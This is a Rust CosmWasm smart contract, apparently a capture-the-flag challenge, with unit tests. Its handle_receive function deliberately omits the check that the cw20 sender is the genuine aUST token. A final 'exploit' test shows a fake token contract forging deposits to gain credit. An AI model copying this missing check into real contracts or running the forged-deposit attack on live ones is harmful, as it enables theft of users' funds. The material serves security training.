use std::convert::TryFrom;
use std::ops::Mul;
use std::str::FromStr;

use crate::error::ContractError;
use crate::msg::{
    AnchorQueryMsg, EpochStateResponse, ExecuteMsg, InstantiateMsg, QueryMsg, ReceiveMsg,
};
use crate::state::{AUST_ADDRESS, USER_BALANCE};
#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::{
    from_slice, to_binary, BalanceResponse, BankMsg, Binary, Coin, CosmosMsg, Decimal256, Deps,
    DepsMut, Env, MessageInfo, QueryRequest, Response, StdError, StdResult, Uint128, Uint256,
    WasmQuery,
};
use cw20::Cw20ReceiveMsg;

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    // admin must provide 1000 uusd when instantiating contract
    if info.funds.len() != 1
        || info.funds[0].denom != "uusd"
        || info.funds[0].amount != Uint128::from(1000_u64)
    {
        return Err(ContractError::Std(StdError::generic_err(
            "Invalid instantiation",
        )));
    }

    let aust_address = deps.api.addr_validate(&msg.aust_address)?;

    AUST_ADDRESS.save(deps.storage, &aust_address)?;

    Ok(Response::new())
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn execute(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: ExecuteMsg,
) -> Result<Response, ContractError> {
    match msg {
        ExecuteMsg::Deposit {} => try_deposit(deps, info),
        ExecuteMsg::Withdraw { amount } => try_withdraw(deps, info, amount),
        ExecuteMsg::Receive(wrapper) => handle_receive(deps, env, info, wrapper),
    }
}

pub fn try_deposit(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
    // validate uusd sent
    if info.funds.len() != 1 || info.funds[0].denom != "uusd" {
        return Err(ContractError::Std(StdError::generic_err(
            "Invalid deposit!",
        )));
    }

    // update user balance
    USER_BALANCE.update(
        deps.storage,
        &info.sender,
        |balance: Option<Uint128>| -> StdResult<_> {
            Ok(balance
                .unwrap_or_default()
                .checked_add(info.funds[0].amount)?)
        },
    )?;

    Ok(Response::new()
        .add_attribute("method", "deposit")
        .add_attribute("amount", info.funds[0].amount))
}

pub fn try_withdraw(
    deps: DepsMut,
    info: MessageInfo,
    amount: Uint128,
) -> Result<Response, ContractError> {
    // decrease user balance
    USER_BALANCE.update(
        deps.storage,
        &info.sender,
        |balance: Option<Uint128>| -> StdResult<_> {
            Ok(balance.unwrap_or_default().checked_sub(amount)?)
        },
    )?;

    // send uusd to user
    let msg = CosmosMsg::Bank(BankMsg::Send {
        to_address: info.sender.to_string(),
        amount: vec![Coin {
            denom: "uusd".to_string(),
            amount,
        }],
    });

    Ok(Response::new()
        .add_message(msg)
        .add_attribute("method", "withdraw")
        .add_attribute("amount", amount))
}

pub fn handle_receive(
    deps: DepsMut,
    env: Env,
    _info: MessageInfo,
    wrapper: Cw20ReceiveMsg,
) -> Result<Response, ContractError> {
    let msg: ReceiveMsg = from_slice(&wrapper.msg)?;
    let total_amount;
    let exchange_rate;
    match msg {
        ReceiveMsg::Deposit {} => {
            // get sender and amount received
            let sender = deps.api.addr_validate(&wrapper.sender)?;
            let amount = wrapper.amount;

            // load storage aust address
            let aust_address = AUST_ADDRESS.load(deps.storage)?;

            // calculate exchange rate for aUST to UST
            let epoch_state = deps
                .querier
                .query::<EpochStateResponse>(&QueryRequest::Wasm(WasmQuery::Smart {
                    // anchor money market address
                    contract_addr: aust_address.to_string(),
                    msg: to_binary(&AnchorQueryMsg::EpochState {
                        block_height: Some(env.block.height),
                        distributed_interest: None,
                    })?,
                }))?;

            // prevent edge cases
            if epoch_state.exchange_rate == Decimal256::zero() {
                return Err(ContractError::Std(StdError::generic_err(
                    "Invalid exchange rate",
                )));
            }
            exchange_rate = epoch_state.exchange_rate;

            let calculated_amount =
                Uint128::try_from(Uint256::from(amount).mul(epoch_state.exchange_rate))
                    .expect("Unable to convert Uint256 into Uint128");
            total_amount = calculated_amount;

            // update user balance
            USER_BALANCE.update(
                deps.storage,
                &sender,
                |balance: Option<Uint128>| -> StdResult<_> {
                    Ok(balance.unwrap_or_default().checked_add(calculated_amount)?)
                },
            )?;
        }
    }

    Ok(Response::new()
        .add_attribute("method", "deposit")
        .add_attribute("sent_amount", wrapper.amount)
        .add_attribute("exchange_rate", exchange_rate.to_string())
        .add_attribute("total_amount", total_amount))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(deps: Deps, _env: Env, msg: QueryMsg) -> StdResult<Binary> {
    match msg {
        QueryMsg::GetBalance { address } => to_binary(&query_balance(deps, address)?),
        QueryMsg::GetAnchorRate {
            block_height,
            distributed_interest,
        } => to_binary(&query_aust_rate(deps, block_height, distributed_interest)?),
    }
}

fn query_balance(deps: Deps, address: String) -> StdResult<BalanceResponse> {
    let user_balance = USER_BALANCE.load(deps.storage, &deps.api.addr_validate(&address)?)?;
    Ok(BalanceResponse {
        amount: Coin {
            denom: "uusd".to_string(),
            amount: Uint128::from_str(&user_balance.to_string())?,
        },
    })
}

fn query_aust_rate(
    deps: Deps,
    block_height: Option<u64>,
    distributed_interest: Option<Uint256>,
) -> StdResult<EpochStateResponse> {
    let aust_address = AUST_ADDRESS.load(deps.storage)?;

    let epoch_state = deps
        .querier
        .query::<EpochStateResponse>(&QueryRequest::Wasm(WasmQuery::Smart {
            contract_addr: aust_address.to_string(),
            msg: to_binary(&AnchorQueryMsg::EpochState {
                block_height,
                distributed_interest,
            })?,
        }))?;

    Ok(epoch_state)
}

#[cfg(test)]
mod tests {
    use std::borrow::BorrowMut;

    use crate::mock_anchor;

    use super::*;
    use cosmwasm_std::testing::{mock_dependencies_with_balance, mock_env, mock_info};
    use cosmwasm_std::{coin, coins, from_binary, Addr, Decimal256, Empty};
    use cw_multi_test::{App, BankSudo, Contract, ContractWrapper, Executor, SudoMsg};
    use mock_anchor::InstantiateMsg as AnchorInstantiateMsg;

    #[test]
    #[should_panic(expected = "Invalid instantiation")]
    fn invalid_init() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));
        let msg = InstantiateMsg {
            aust_address: "terra1hzh9vpxhsk8253se0vv5jj6etdvxu3nv8z07zu".to_string(),
        };
        let info = mock_info("creator", &coins(0, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();
    }

    #[test]
    fn deposit_success() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {
            aust_address: "terra1hzh9vpxhsk8253se0vv5jj6etdvxu3nv8z07zu".to_string(),
        };
        let info = mock_info("creator", &coins(1000, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // user able to deposit uusd
        let info = mock_info("alice", &coins(100, "uusd"));
        let msg = ExecuteMsg::Deposit {};
        let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

        // verify deposit succeeded
        let res = query(
            deps.as_ref(),
            mock_env(),
            QueryMsg::GetBalance {
                address: "alice".to_string(),
            },
        )
        .unwrap();
        let value: BalanceResponse = from_binary(&res).unwrap();
        assert_eq!(Uint128::from(100_u64), value.amount.amount);
    }

    #[test]
    #[should_panic(expected = "Invalid deposit!")]
    fn deposit_failure() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {
            aust_address: "terra1hzh9vpxhsk8253se0vv5jj6etdvxu3nv8z07zu".to_string(),
        };
        let info = mock_info("creator", &coins(1000, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // other funds such as uluna with not be recorded
        let info = mock_info("bob", &coins(10, "uluna".to_string()));
        let msg = ExecuteMsg::Deposit {};
        let _err = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
    }

    /// helper function to setup aust and ctf contract and return the addresses
    fn setup_contracts(app: &mut App) -> (Addr, Addr) {
        // create mock anchor contract box
        fn aust_contract() -> Box<dyn Contract<Empty>> {
            let contract = ContractWrapper::new(
                mock_anchor::execute,
                mock_anchor::instantiate,
                mock_anchor::query,
            );
            Box::new(contract)
        }

        // create ctf contract box
        fn ctf_contract() -> Box<dyn Contract<Empty>> {
            let contract = ContractWrapper::new(
                crate::contract::execute,
                crate::contract::instantiate,
                crate::contract::query,
            );
            Box::new(contract)
        }

        // store aust and ctf code id
        let aust_id = app.store_code(aust_contract());
        let ctf_id = app.store_code(ctf_contract());

        // mock anchor init msg
        let msg = AnchorInstantiateMsg {};

        // init aust contract
        let aust_init = app
            .instantiate_contract(
                aust_id,
                Addr::unchecked(ADMIN_ADDR),
                &msg,
                &[],
                "aust address",
                None,
            )
            .unwrap();

        // ctf contract init msg
        let msg = InstantiateMsg {
            aust_address: aust_init.to_string(), // use initialized aust contract addr
        };

        // mint tokens to admin
        let init_funding = vec![coin(1_000, "uusd")];
        app.sudo(SudoMsg::Bank({
            BankSudo::Mint {
                to_address: ADMIN_ADDR.to_string(),
                amount: init_funding.clone(),
            }
        }))
        .unwrap();

        // init ctf contract
        let ctf_init = app
            .instantiate_contract(
                ctf_id,
                Addr::unchecked(ADMIN_ADDR),
                &msg,
                &coins(1_000, "uusd".to_string()),
                "aust address",
                None,
            )
            .unwrap();

        (aust_init, ctf_init)
    }

    const ADMIN_ADDR: &str = "admin";
    const ALICE: &str = "alice";
    const HACKER: &str = "hacker";

    #[test]
    fn test_aust_query() {
        let mut app = App::default();
        let (_, ctf_init) = setup_contracts(&mut app);
        let res: EpochStateResponse = app
            .borrow_mut()
            .wrap()
            .query_wasm_smart(
                &ctf_init,
                &QueryMsg::GetAnchorRate {
                    block_height: None,
                    distributed_interest: None,
                },
            )
            .unwrap();
        assert_eq!(res.exchange_rate, Decimal256::from_str("1.20").unwrap());
    }

    #[test]
    fn aust_deposit() {
        let mut app = App::default();
        let (aust_init, ctf_init) = setup_contracts(&mut app);

        // aust deposit msg
        let msg = ExecuteMsg::Receive(Cw20ReceiveMsg {
            sender: ALICE.to_string(),
            amount: Uint128::from(1_000_u64),
            msg: to_binary(&ReceiveMsg::Deposit {}).unwrap(),
        });

        // execute msg
        let res = app
            .borrow_mut()
            .execute_contract(aust_init, ctf_init.clone(), &msg, &[])
            .unwrap();

        assert_eq!(res.events[1].attributes[2].value, 1_000.to_string()); // sent_amount
        assert_eq!(res.events[1].attributes[3].value, "1.2"); // exchange_rate

        let res: BalanceResponse = app
            .borrow_mut()
            .wrap()
            .query_wasm_smart(
                &ctf_init,
                &QueryMsg::GetBalance {
                    address: ALICE.to_string(),
                },
            )
            .unwrap();

        assert_eq!(res.amount.denom, "uusd".to_string());
        assert_eq!(res.amount.amount, Uint128::from(1_200_u64)); // 1_000 aUST * 1.20 exchange rate = 1_200 UST
    }

    #[test]
    fn exploit() {
        let mut app = App::default();
        let (_, ctf_init) = setup_contracts(&mut app);

        // construct deposit msg
        let msg = ExecuteMsg::Receive(Cw20ReceiveMsg {
            sender: HACKER.to_string(),
            amount: Uint128::from(10_000_u64),
            msg: to_binary(&ReceiveMsg::Deposit {}).unwrap(),
        });

        // since there's no cw20 addr check, an attacker can simply create a new token and send to the contract
        let fake_contract = Addr::unchecked("hacker001");

        // execute msg
        app.borrow_mut()
            .execute_contract(fake_contract, ctf_init.clone(), &msg, &[])
            .unwrap();

        let res: BalanceResponse = app
            .borrow_mut()
            .wrap()
            .query_wasm_smart(
                &ctf_init,
                &QueryMsg::GetBalance {
                    address: HACKER.to_string(),
                },
            )
            .unwrap();

        assert_eq!(res.amount.amount, Uint128::from(12_000_u64)); // 10_000 aUST * 1.20 exchange rate = 12_000 UST
    }
}
